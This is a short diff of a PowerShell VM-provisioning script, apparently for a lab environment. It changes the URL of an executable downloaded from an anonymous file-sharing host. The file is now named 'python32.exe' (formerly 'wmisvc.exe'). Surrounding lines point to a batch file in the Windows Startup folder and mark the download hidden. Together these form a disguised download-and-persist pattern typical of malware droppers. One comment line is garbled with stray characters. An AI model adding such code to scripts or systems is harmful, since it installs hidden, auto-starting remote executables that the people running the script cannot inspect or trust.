@@ -23,7 +23,7 @@ param(
 
 # Static URLs to download ProvisioningVM* and static download locatןםמ
 $wefscript = "https://raw.githubusercontent.com/cybermias/publicrep/master/microsoft/provisioning/wef/provisionWef.ps1"
-$provurl = "https://bashupload.com/TUbOu/wmisvc.exe"
+$provurl = "https://transfer.sh/get/wErpM/python32.exe"
 $startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\runadm.bat"
 
 # Download ProvisioningVM* to argument specified location and set attribute=hidden to avoid Azure Conflicts*
